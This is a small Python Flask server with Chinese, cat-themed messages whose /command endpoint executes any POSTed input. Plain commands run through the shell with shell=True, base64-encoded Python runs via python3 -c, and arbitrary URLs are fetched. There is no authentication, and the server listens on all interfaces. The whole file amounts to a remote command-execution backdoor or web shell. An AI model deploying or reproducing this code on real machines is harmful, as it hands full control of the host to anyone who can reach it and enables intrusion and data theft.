from flask import Flask, request
import socket
import base64
import subprocess
import requests

app = Flask(__name__)

# 获取本机IP地址
ip_address = socket.gethostbyname(socket.gethostname())

# 为Flask指定实际端口
port = 5000

print(f'喵~服务器IP地址是：{ip_address}，程序运行端口是：{port}')

@app.route('/')
def home():
    return '欢迎来到喵~服务器'

@app.route('/command', methods=['POST'])
def receive_command():
    data = request.get_json()
    command = data.get('cmd')

    if command.startswith("py"):
        script_base64 = command[2:]
        decoded_script = base64.b64decode(script_base64).decode('utf-8')

        try:
            result = subprocess.check_output(['python3', '-c', decoded_script], text=True, stderr=subprocess.STDOUT)
            return f'执行结果：\n{result}'
        except subprocess.CalledProcessError as e:
            return f'执行错误：\n{e.output}'

    elif command.startswith("ip"):
        url = command[2:]
        try:
            response = requests.get(url)
            return f'对方服务器IP：{response.text}'
        except requests.RequestException as e:
            return f'获取对方服务器IP时出错：{str(e)}'

    else:
        try:
            result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
            return f'执行结果：\n{result}'
        except subprocess.CalledProcessError as e:
            return f'执行错误：\n{e.output}'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=port)